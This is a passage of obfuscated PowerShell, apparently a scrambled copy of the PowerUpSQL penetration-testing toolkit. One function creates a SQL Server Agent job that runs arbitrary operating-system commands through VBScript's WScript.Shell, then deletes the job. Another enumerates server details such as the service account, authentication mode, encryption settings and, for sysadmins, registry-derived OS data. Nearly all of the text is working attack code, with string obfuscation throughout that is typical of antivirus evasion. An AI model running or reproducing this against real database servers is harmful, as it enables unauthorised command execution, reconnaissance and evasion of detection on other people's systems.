 '+' '+' '+' '+'set'+' '+'sh'+'ell= '+'C'+'r'+'eat'+'eObject '+('({0}WSc'+'r'+'ipt.S'+'he'+'l'+'l{0}'+')
 ') -f  [CHaR]34+' '+' '+' '+('shell.r'+'u'+'n(4I3l5g'+'Comm'+'and4I3'+')
 ')."reP`lAce"(([chaR]108+[chaR]53+[chaR]103),'$')."REp`LA`ce"(([chaR]52+[chaR]73+[chaR]51),[strING][chaR]34)+' '+' '+' '+'se'+'t '+'s'+'hell '+'= '+'no'+'thi'+'ng
END'+' '+(('Functi'+'o'+'n
'+'5lU') -cRePlaCe  ([CHar]53+[CHar]108+[CHar]85),[CHar]34))
                    
                    ${COM`m`AND} = ${Vb`Sc`RiPT_CO`mmand}
                    ${Su`B`SysTEM`FInAl} = ("{0}{3}{1}{2}" -f 'Acti','ipti','ng','veScr')
                    ${d`A`TabAS`eSUB} = ((("{7}{4}{1}{3}{6}{5}{2}{0}" -f '8gs,','_n','pt','ame=N8gsVBSc','atabase','i','r','@d'))-crePLaCe  '8gs',[CHar]39)	
                }                

                
                ${cOmM`ANd} = ${c`O`Mmand} -replace "'","''"

                
                
                
                
                
                ${jOb`qu`ERY} = ('US'+'E '+'msd'+'b'+'; '+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'EXEC'+'UTE'+' '+'dbo'+'.s'+'p'+'_add_j'+'ob '+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'@'+'j'+'ob_name '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'= '+(('N'+'YHlpo'+'w'+'erupsql_jobYH'+'l
 ')  -rEpLaCe([chaR]89+[chaR]72+[chaR]108),[chaR]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'EXECU'+'TE'+' '+'s'+'p_add_j'+'ob'+'step '+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'@'+'job_name'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'= '+('NADqpo'+'w'+'erupsq'+'l_'+'jobADq,
'+' ')."r`ePL`AcE"('ADq',[StRing][char]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'@step_nam'+'e'+' '+' '+' '+' '+' '+' '+' '+' '+' '+'= '+('N2zQpow'+'e'+'rupsql_jo'+'b'+'_step2zQ, ')."REp`l`ACe"('2zQ',[sTRING][ChAr]39)+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'@su'+'bs'+'ystem'+' '+' '+' '+' '+' '+' '+' '+' '+' '+'= '+"N'$SubSystemFinal', "+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'@co'+'mmand'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'= '+"N'$Command',
 "+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"$DatabaseSub "+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'@f'+'lag'+'s=0,
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'@r'+'etry_'+'att'+'empts'+' '+' '+' '+' '+'= '+'1,'+' '+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'@ret'+'ry'+'_interv'+'al'+' '+' '+' '+' '+'= '+'5 '+' '+' '+' '+' '+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'
'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'EXE'+'CU'+'TE '+'db'+'o'+'.'+'sp_add_jobserve'+'r '+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'@jo'+'b_'+'n'+'ame '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'= '+('N'+'w'+'Dmpow'+'erupsql'+'_jo'+'b'+'wDm
 ')."RE`PlA`CE"(([cHaR]119+[cHaR]68+[cHaR]109),[STrIng][cHaR]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'EXECU'+'TE'+' '+'dbo.s'+'p_'+'s'+'tart_'+'jo'+'b '+('N{'+'0}'+'poweru'+'psql_'+'job{'+'0}')  -f[ChAr]39)

                ${C`LE`Anu`p`QuERY} = ((("{0}{2}{1}{4}{7}{3}{13}{5}{11}{12}{6}{8}{9}{10}{14}"-f 'USE ','sdb; EXECUT','m','s','E','lete_job @','_na',' ','m','e ','= Nueopowerupsql_jobu','j','ob','p_de','eo;'))."RE`PLa`cE"('ueo',[stRiNg][cHaR]39))

                &("{1}{0}{2}"-f'ite-','Wr','Verbose') -Message ("$Instance "+': '+'Runn'+'ing '+'the'+' '+'com'+'m'+'and')

                
                &("{2}{0}{1}"-f 'et-SQLQu','ery','G') -Instance ${iN`sTA`NcE} -Query ${J`oBQu`e`Ry} -Username ${U`sErn`AME} -Password ${P`AS`swo`Rd} -Credential ${CrEden`T`IAL} -SuppressVerbose
                
                ${REs`U`lt} = &("{2}{1}{0}"-f'y','-SQLQuer','Get') -Instance ${IN`sTAn`CE} -Query ((("{5}{1}{11}{7}{3}{10}{8}{4}{0}{6}{2}{9}" -f '}',' E','erupsql_jo','sp_','b_name = N{0','use msdb;','pow','E ','lp_job @jo','b{0}','he','XECUT'))-f [cHaR]39) -Username ${usER`NA`ME} -Password ${PAs`s`woRd} -Credential ${c`R`EdEnt`iAL} -SuppressVerbose
                
                if(!(${res`UlT})) {
                    &("{4}{3}{1}{0}{2}" -f'in','n','g','ar','Write-W') ("{5}{9}{4}{2}{11}{7}{6}{10}{1}{3}{8}{0}"-f'n.','r','s','y ','o ','Job failed','d an','an','agai',' t','d t','tart. Recheck your comm')
                    ${nU`Ll} = ${t`Blr`e`sULtS}."RO`WS".("{1}{0}" -f 'd','Ad').Invoke("$ComputerName","$Instance",("{2}{7}{1}{4}{8}{5}{0}{6}{3}"-f 'sta',' ','A','t.','Job','ailed to ','r','gent',' f'))
                    return
                }

                
                &("{1}{0}{2}" -f 'rite-Ver','W','bose') ("$Instance "+': '+'S'+'t'+'arting '+'sl'+'eep '+'fo'+'r '+"$Sleep "+'s'+'econ'+'ds')
                &("{2}{1}{0}"-f 'leep','S','Start-') ${sLe`eP}

                
                &("{3}{0}{2}{1}"-f'e','e','-Verbos','Writ') ("$Instance "+': '+'Remo'+'v'+'ing '+'jo'+'b '+'fr'+'om '+'serv'+'er')
                &("{0}{3}{2}{1}"-f'Get','Query','L','-SQ') -Instance ${iNst`AncE} -Query ${C`l`e`ANUpQ`UeRY} -Username ${USE`RnA`ME} -Password ${pAS`Sw`oRD} -Credential ${CRE`DE`NTiAl} -SuppressVerbose
                ${n`ULL} = ${tb`l`R`eSULtS}."r`ows".("{1}{0}" -f'd','Ad').Invoke("$ComputerName","$Instance",("{2}{8}{1}{4}{6}{0}{5}{3}{7}" -f 'ar','ccesfu','The Job ','nd was','lly s','ted a','t',' removed.','su'))

            }
            else
            {
                &("{2}{1}{3}{0}"-f'ose','Ver','Write-','b') -Message ("$Instance "+': '+'Yo'+'u '+'d'+'o '+'not'+' '+'ha'+'ve '+'p'+'r'+'ivilege'+'s '+'to'+' '+'ad'+'d '+'age'+'nt '+'jobs'+' '+'(s'+'p_'+'ad'+'d_job). '+'Ab'+'orti'+'ng...')
                ${nU`ll} = ${T`B`LrEsu`LTS}."ro`Ws".("{0}{1}"-f'A','dd').Invoke("$ComputerName","$Instance",("{0}{1}{6}{2}{4}{3}{7}{5}"-f 'Insufficien','t privi','s ','o add','t','Agent Jobs.','liege',' '))
                return
            }

            
            ${CoNnecT`I`oN}.("{1}{0}"-f'se','Clo').Invoke()

            
            ${CoN`N`EctIoN}.("{2}{0}{1}"-f 's','pose','Di').Invoke()

            
            &("{1}{2}{0}"-f'se','Write-V','erbo') -Message ("$Instance "+': '+'Co'+'mm'+'and '+'c'+'om'+'plete')
        }
        catch
        {
            
            if(-not ${sup`presSVE`RBOSe})
            {
                ${er`RorM`es`S`Age} = ${_}."eXce`p`T`ioN"."mes`S`AgE"
                &("{1}{2}{3}{0}"-f 'rbose','Wri','te','-Ve') -Message ("$Instance "+': '+'Con'+'ne'+'ction '+'Fai'+'le'+'d.')
                
            }
            ${N`ULl} = ${tb`lre`sULTs}."r`Ows".("{1}{0}" -f'dd','A').Invoke("$ComputerName","$Instance",("{0}{2}{3}{4}{1}"-f 'N','ible','o','t Acces','s'))
        }

        return ${t`BLR`eSuLtS}
    }
}






Function  G`e`T-SqLs`ErvEr`inFo
{
    
    [CmdletBinding()]
    Param(
        [Parameter(mANdaTOrY = ${f`A`lse},
        helpMESsAge = {"{4}{10}{11}{7}{8}{9}{2}{1}{0}{5}{6}{3}"-f 'to','t ','oun','ith.','SQL ',' authe','nticate w','d','omain ','acc','Server ','or '})]
        [string]${Us`erN`Ame},

        [Parameter(mandaTory = ${fA`lse},
        heLPMeSsage = {"{3}{5}{7}{1}{8}{10}{2}{9}{0}{4}{6}{11}" -f ' to ','n ','asswor','S','au','QL Server or ','thenticate w','domai','accoun','d','t p','ith.'})]
        [string]${pA`SS`Word},

        [Parameter(MAndAToRY = ${f`AlSE},
        helPMesSaGE = {"{3}{0}{2}{4}{1}"-f'w','s.','s creden','Windo','tial'})]
        [System.Management.Automation.PSCredential]
        [System.Management.Automation.Credential()]${creden`Ti`Al} =   (  vaRIABlE 0459m2  ).vaLUE::"eM`pTY",

        [Parameter(MAnDaTORy = ${FA`L`Se},
                vAlueFrompIPeLINEbyPROPeRTynAMe = ${t`RuE},
        heLpMEsSAGE = {"{0}{2}{4}{3}{5}{6}{1}" -f 'SQL Server ins','to.','tan','e to connect','c','i','on '})]
        [string]${InSta`NCE},

        [Parameter(MAnDaTORy = ${f`Al`se},
        heLPMESSAGE = {"{0}{9}{4}{3}{14}{2}{7}{13}{8}{10}{5}{15}{12}{11}{6}{1}{16}"-f 'Suppr','wrapp','se er','erb','v','en fu','s ','rors','  ','ess ','Used wh','i','tion ','.','o','nc','ed.'})]
        [switch]${suPpRESSvE`RB`OsE}
    )

    Begin
    {
        
        ${tbLSErvE`Ri`N`Fo} = &("{1}{2}{0}" -f'-Object','N','ew') -TypeName ("{3}{0}{2}{4}{1}"-f 'tem','ata.DataTable','.','Sys','D')
    }

    Process
    {
        
        ${cOmPutER`N`A`ME} = &("{2}{4}{1}{3}{0}"-f 'mInstance','ameFr','Get-Comp','o','uterN') -Instance ${in`St`ANCE}

        
        if(-not ${In`S`TanCe})
        {
            ${i`NstAn`ce} = ${Env`:C`oMPuTEr`NAme}
        }

        
        ${tEsTCOn`Necti`On} = &("{6}{3}{4}{1}{0}{5}{2}" -f 'ionT','t','st','-','SQLConnec','e','Get') -Instance ${I`N`StAncE} -Username ${U`sERNa`Me} -Password ${Pa`SSWo`Rd} -Credential ${cr`edE`Nt`IAl} -SuppressVerbose | &("{0}{1}{2}"-f 'Wh','ere-','Object') -FilterScript {
            ${_}."staT`Us" -eq ("{0}{1}{2}" -f 'Acces','s','ible')
        }
        if(${TEsT`Co`NneC`Ti`ON})
        {
            if( -not ${SU`ppReSS`V`eRbOSE})
            {
                &("{0}{1}{2}{3}"-f'Wr','it','e-Verbo','se') -Message ("$Instance "+': '+'C'+'onnec'+'tion'+' '+'Suc'+'c'+'ess.')
            }
        }
        else
        {
            if( -not ${suPprEssv`er`B`O`Se})
            {
                &("{3}{1}{0}{2}" -f 'Ver','rite-','bose','W') -Message ("$Instance "+': '+'Co'+'n'+'necti'+'on '+'Faile'+'d.')
            }
            return
        }

        
        ${A`c`TiV`ese`SsIOns} = &("{1}{0}{3}{2}" -f'QLS','Get-S','n','essio') -Instance ${in`staNcE} -Credential ${c`R`eDenTIAL} -Username ${u`sEr`NAme} -Password ${paSsW`ORD} -SuppressVerbose |
        &("{3}{1}{2}{0}" -f 'ct','O','bje','Where-') -FilterScript {
            ${_}."SeS`SiON`s`TAtus" -eq ("{1}{0}"-f'unning','r')
        } |
        &("{1}{3}{0}{2}"-f 'asure-Obj','M','ect','e') -Line |
        &("{1}{0}{2}" -f '-','Select','Object') -Property ("{1}{0}"-f'es','Lin') -ExpandProperty ("{0}{1}" -f'Li','nes')

        
        ${I`S`sysadM`IN} = &("{0}{1}{2}{3}"-f 'Get-SQ','LSysadm','i','nCheck') -Instance ${I`NSTaNCe} -Credential ${CRE`de`N`TiaL} -Username ${u`SERnA`me} -Password ${PAss`WorD} -SuppressVerbose | &("{1}{0}{3}{2}"-f'el','S','t','ect-Objec') -Property ("{1}{0}{2}"-f'ysa','IsS','dmin') -ExpandProperty ("{0}{1}{3}{2}" -f 'Is','S','in','ysadm')

        if(${i`SsyS`A`dmiN} -eq 'Yes')
        {
            
            ${Sy`sA`d`minSETUP} = ((("{115}{10}{146}{60}{19}{51}{50}{53}{148}{127}{34}{4}{67}{29}{21}{118}{38}{55}{23}{125}{54}{26}{152}{64}{120}{129}{78}{84}{68}{92}{126}{58}{65}{15}{138}{112}{17}{142}{48}{30}{3}{40}{105}{136}{49}{121}{134}{22}{72}{46}{13}{66}{11}{5}{33}{43}{137}{149}{107}{25}{14}{99}{96}{85}{16}{128}{139}{83}{27}{71}{131}{62}{42}{95}{32}{39}{130}{102}{2}{74}{18}{117}{93}{144}{80}{6}{57}{70}{109}{151}{103}{59}{36}{153}{106}{145}{56}{90}{140}{75}{111}{100}{116}{113}{77}{150}{41}{123}{8}{9}{82}{24}{0}{89}{1}{124}{52}{45}{47}{143}{86}{12}{76}{87}{94}{108}{91}{98}{31}{61}{119}{101}{122}{141}{81}{73}{20}{44}{114}{69}{79}{7}{147}{135}{88}{132}{133}{28}{37}{110}{35}{97}{104}{63}"-f'L','HINE{1}',' ','{1','y','{0}','     ','e','  @r','o','  ','lSet','ft{0}Win','Con','a','{','N{','AC','-- Ge','ine','N{1}Pr','S','S','  ','Y_','lue_n','      ',',
   ',' ','  ','E','1},
 ','MachineTyp','Control{0','T','ue','NA',' @','A','e outpu','},
','   ','		= ','}ProductOptions{1},
 ','od','          @key			= N{1}','TEM{0}Current','SOFTW','IN','key','type
         ',' ','  ','       DEC','     ','ME
','U','    ','otkey','  SYS','h','   ','lue	','Name output','E ','		= N','tro','pe','
    ','a',' DECLARE @P','       ','YS','ame		= ',' ','te','dows NT','_regre','ea','m','    ','n','otkey		= N{1}HKE','oductType{1}','d',' ','icroso','{0}C','
       ','OCAL_MAC','TE m','tVersio','        ','v','urre','@','		=','		','n{','me','.dbo','   @','             ','tName','	= @Product','            ','
               ','          @va','n','ro','val','r','KEY_LOCAL_M','p','uctN','
    ','.x','t OS ','YSN','         ','master.d','			','valu','       ',',
    ','   ','    @ro','ARE @Machine','1}','bo.xp_regr','t

 ','      @va',' ','  ','= N{1}',',','    @','    ','1}H','Pr','as','e_','H','ARE{0}M','ersion
  ',' EXEC','          -- Get mac','{1}','L',' ','ad
    ','duc','EXECUT','ME'))  -f  [CHaR]92,[CHaR]39)

            ${sysadm`in`QuerY} = ("{2}{0}{8}{6}{14}{9}{5}{12}{7}{3}{11}{4}{10}{13}{1}"-f' ',',',' ','duct','s [OSVersion','
      ',' [OsMachin',' @Pro','@MachineType as','],','Nam','Name a','     ','e]','eType')
        }
        else
        {
            ${SY`S`A`DmiN`SEtuP} = ''
            ${S`Ys`ADmI`NQuerY} = ''
        }

        
        ${q`UE`Ry} = (' '+' '+'-'+'- '+'Ge'+'t '+'S'+'QL '+'S'+'erver '+'In'+'for'+'m'+'ation'+'

 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'--'+' '+'Ge'+'t '+'SQL'+' '+'Ser'+'ve'+'r '+'Serv'+'ice '+'N'+'ame '+'a'+'nd '+'Path
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'D'+'E'+'CLARE '+'@SQ'+'LServe'+'rInstanc'+'e '+'varch'+'ar(25'+'0'+')'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'D'+'EC'+'LARE '+'@'+'SQLServerS'+'erviceN'+'a'+'m'+'e '+'varc'+'h'+'ar'+'(250)
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'if'+' '+'@@SE'+'RVIC'+'ENAM'+'E '+'= '+('X'+'E9M'+'SS'+'QLSERVERXE9
 ')."Re`Pla`cE"(([CHar]88+[CHar]69+[CHar]57),[sTrInG][CHar]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'BEGI'+'N
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'se'+'t '+'@'+'S'+'Q'+'L'+'ServerInstance '+'= '+('{0'+'}S'+'Y'+'ST'+'EM{1}Curre'+'nt'+'Contro'+'lSe'+'t{1'+'}Service'+'s{1'+'}MSSQL'+'SERVER'+'{'+'0}
 ')  -F [chAr]39,[chAr]92+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'set'+' '+'@SQLS'+'e'+'r'+'v'+'erServic'+'eNa'+'me '+'= '+('{0}M'+'SSQLSER'+'VER'+'{0}
 ')  -f[ChAR]39+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'END'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'ELSE
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'BE'+'GI'+'N
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'set'+' '+'@SQLS'+'erv'+'erInsta'+'nce '+'= '+"'SYSTEM\CurrentControlSet\Services\MSSQL$'+cast(@@SERVICENAME "+'a'+'s '+'va'+'rchar(250'+'))
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'s'+'et '+'@SQ'+'LS'+'erverS'+'erv'+'ic'+'eName'+' '+'= '+"'MSSQL$'+cast(@@SERVICENAME "+'as'+' '+'v'+'ar'+'ch'+'ar(250))
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'END

'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'--'+' '+'G'+'et '+'SQL'+' '+'Se'+'rve'+'r '+'S'+'e'+'rvice '+'Ac'+'cou'+'nt
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'DEC'+'LAR'+'E '+'@S'+'er'+'vice'+'A'+'ccou'+'ntName '+'va'+'rch'+'ar(2'+'50)
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'EXECUT'+'E '+'mas'+'t'+'er.d'+'bo.xp_instance'+'_re'+'g'+'r'+'ea'+'d
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('N{0}H'+'KEY_L'+'OCAL_M'+'ACHINE{0'+'}'+', ')  -f  [ChAr]39+'@'+'SQ'+'LServer'+'Insta'+'n'+'ce,
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('Nl'+'G1Ob'+'jec'+'tN'+'amelG1,'+'@'+'Ser'+'vice'+'AccountNa'+'me ')."r`EpLAcE"(([cHaR]108+[cHaR]71+[cHaR]49),[StriNG][cHaR]39)+'OUTPU'+'T'+', '+(('NVXJno_out'+'put'+'VX'+'J

 ')  -rEPLACE ([CHAr]86+[CHAr]88+[CHAr]74),[CHAr]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'-'+'- '+'G'+'et '+'a'+'uthenti'+'cati'+'on '+'mo'+'de
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'DE'+'CLAR'+'E '+'@Au'+'th'+'entic'+'atio'+'nMo'+'de '+'INT'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'EX'+'EC '+'mas'+'te'+'r'+'.db'+'o.xp'+'_'+'i'+'nstance_regread'+' '+(('Nn8MHKEY_'+'LOC'+'AL'+'_MACHINEn8M,
 ') -crEPLaCE  'n8M',[chaR]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('N{1}So'+'ftware{0'+'}Mi'+'c'+'roso'+'ft{0}'+'MSSQL'+'Server{0}MS'+'SQ'+'L'+'Server{1},
 ')  -F  [CHAR]92,[CHAR]39+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('Nr2'+'iLoginMo'+'de'+'r'+'2i, ')."re`Pl`ACe"(([cHaR]114+[cHaR]50+[cHaR]105),[STriNG][cHaR]39)+'@Auth'+'enticationM'+'ode'+' '+'OU'+'TPUT'+'

 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'--'+' '+'Ge'+'t '+'t'+'he '+'f'+'orced'+' '+'encrypt'+'ion'+' '+'f'+'lag
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'B'+'EGIN '+'T'+'RY '+'
'+'	 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'DECLARE'+' '+'@Fo'+'rcedEn'+'crypti'+'on '+'INT
'+'	 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'EXE'+'C '+'mast'+'er'+'.dbo.xp_'+'inst'+'ance_re'+'gread'+' '+('N{0}HKEY_LOC'+'A'+'L_M'+'ACHINE{0'+'}'+',
	 ')  -F  [chAr]39+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('N'+'LVbSOFTW'+'AR'+'Eh'+'O'+'mM'+'ICROSOF'+'ThOm'+'Microsoft ').("{0}{1}"-f'REpl','AcE').Invoke('hOm','\')."r`ePLA`CE"(([ChAr]76+[ChAr]86+[ChAr]98),[STriNG][ChAr]39)+'SQ'+'L '+('Se'+'rver{0'+'}MSSQLServ'+'er{'+'0}S'+'up'+'erS'+'ocketNetLib'+'{1},
	'+' ')  -f [ChaR]92,[ChaR]39+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('N8TZForceEnc'+'r'+'yp'+'tio'+'n'+'8TZ, ')."RE`p`LACE"(([cHAR]56+[cHAR]84+[cHAR]90),[stRing][cHAR]39)+'@'+'ForcedEn'+'cr'+'yption '+'O'+'UTP'+'UT
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'EN'+'D '+'TRY
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'BEGI'+'N '+'CAT'+'C'+'H	 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'EN'+'D '+'CATC'+'H

'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'--'+' '+'Grab'+' '+'additio'+'n'+'al '+'in'+'forma'+'tion '+'a'+'s '+'s'+'y'+'sadmin
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"$SysadminSetup

 "+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'-'+'- '+'Re'+'tu'+'rn '+'ser'+'ve'+'r '+'an'+'d '+'ver'+'sion'+' '+'info'+'r'+'mat'+'ion
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'SEL'+'EC'+'T '+' '+"'$ComputerName' "+'a'+'s '+'[Comp'+'uterNa'+'m'+'e]'+',
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'@'+'@server'+'n'+'ame'+' '+'a'+'s '+'[In'+'stance]'+','+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'DEFAULT'+'_DOM'+'AI'+'N()'+' '+'as'+' '+'[Do'+'m'+'ainN'+'ame],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('SERVE'+'RP'+'ROPERTY'+'(rkBpro'+'c'+'e'+'ss'+'id'+'rkB)'+' ')."rePla`Ce"('rkB',[StRINg][chAR]39)+'as'+' '+'S'+'e'+'r'+'vicePr'+'oce'+'s'+'sID,
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'@SQLSer'+'v'+'er'+'Servic'+'eNa'+'m'+'e '+'as'+' '+'[Ser'+'viceName'+'],'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'@'+'ServiceAccount'+'Nam'+'e '+'a'+'s '+'['+'Ser'+'viceA'+'c'+'count],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'(SELE'+'C'+'T '+'CA'+'SE '+'@'+'Auth'+'entica'+'tionM'+'ode'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'WHEN'+' '+'1 '+'THEN'+' '+('P'+'qoWi'+'n'+'do'+'ws ')."Re`PL`AcE"('Pqo',[STrinG][Char]39)+(('Aut'+'hent'+'icati'+'onz'+'2I
 ') -rEPlAcE 'z2I',[ChAR]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'WHEN'+' '+'2 '+'THE'+'N '+('d'+'X'+'uWi'+'ndows ')."rePL`A`Ce"(([chaR]100+[chaR]88+[chaR]117),[stRING][chaR]39)+'an'+'d '+'SQL'+' '+'Se'+'rver '+('Aut'+'henticati'+'onYcz'+'
'+' ')."r`eplACe"('Ycz',[stRiNG][ChAr]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'E'+'LSE '+('8U'+'uUnknow'+'n8Uu
 ')."REp`lacE"('8Uu',[sTring][ChaR]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'END)'+' '+'a'+'s '+'[Auth'+'en'+'tica'+'tion'+'Mod'+'e],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'@'+'F'+'orcedEncr'+'yption'+' '+'a'+'s '+'ForcedEncr'+'ypt'+'ion,
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'CAS'+'E '+' '+('SERVE'+'RPR'+'OP'+'E'+'RTY({0}Is'+'Cl'+'u'+'ste'+'r'+'ed{0'+'})
 ')  -F[chAR]39+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'WHEN'+' '+'0
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'TH'+'EN '+(('pT'+'2No'+'pT2
 ')-cReplAce ([chAr]112+[chAr]84+[chAr]50),[chAr]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'E'+'LSE '+('0n'+'QYes'+'0'+'nQ'+'
 ')."r`EplACE"(([CHaR]48+[CHaR]110+[CHaR]81),[STrIng][CHaR]39)+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'EN'+'D '+'a'+'s '+'[Clus'+'tered],'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('SERVER'+'P'+'ROPERT'+'Y({'+'0}pro'+'ductvers'+'i'+'on{'+'0})'+' ')-f[chaR]39+'a'+'s '+'['+'SQL'+'Serv'+'e'+'r'+'VersionNumber],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'SUBSTRI'+'N'+'G(@'+'@'+'VE'+'RSI'+'ON, '+('CHARIN'+'D'+'EX('+'8ud28ud, ')."r`eP`lACe"(([ChAr]56+[ChAr]117+[ChAr]100),[sTrinG][ChAr]39)+'@@V'+'ER'+'SION), '+'4'+') '+'as'+' '+'[SQ'+'LServ'+'e'+'rMaj'+'orV'+'ersion'+']'+',
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('server'+'propert'+'y'+'({0}E'+'d'+'iti'+'on'+'{0}) ') -f[cHAR]39+'as'+' '+'[SQLServerE'+'dition'+']'+','+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+('SE'+'R'+'VE'+'RPR'+'OPERTY(9'+'RvPr'+'oductLe'+'vel9Rv'+') ')."rE`pLa`ce"('9Rv',[STRINg][CHAr]39)+'AS'+' '+'[S'+'QL'+'ServerSer'+'vicePack],'+'
'+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'SUBS'+'T'+'RING(@@VE'+'RSI'+'ON'+', '+(('C'+'HARIN'+'DEX(lT'+'zxl'+'Tz, ') -RePLace([CHAr]108+[CHAr]84+[CHAr]122),[CHAr]39)+'@'+'@V'+'ERSIO'+'N), '+'3)'+' '+'a'+'s '+'['+'O'+'SArc'+'hit'+'ec'+'ture],'+'
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"$SysadminQuery
 "+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'RIGHT('+'SU'+'BS'+'TR'+'ING'+'('+'@@VERSION, '+('CH'+'A'+'RIND'+'EX'+'(wN'+'JWindows ')."re`pLaCe"('wNJ',[sTRIng][ChaR]39)+('N'+'T{'+'0},'+' ') -f[CHAR]39+'@@VE'+'RS'+'ION), '+'14),'+' '+'3'+') '+'a'+'s '+'[Os'+'Ve'+'rsi'+'onNum'+'ber'+'],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+'S'+'Y'+'STEM_USER '+'as'+' '+'[Curr'+'e'+'ntl'+'ogin],
 '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+' '+"'$IsSysadmin' "+'a'+'s '+'['+'IsSy'+'sadmin'+'],
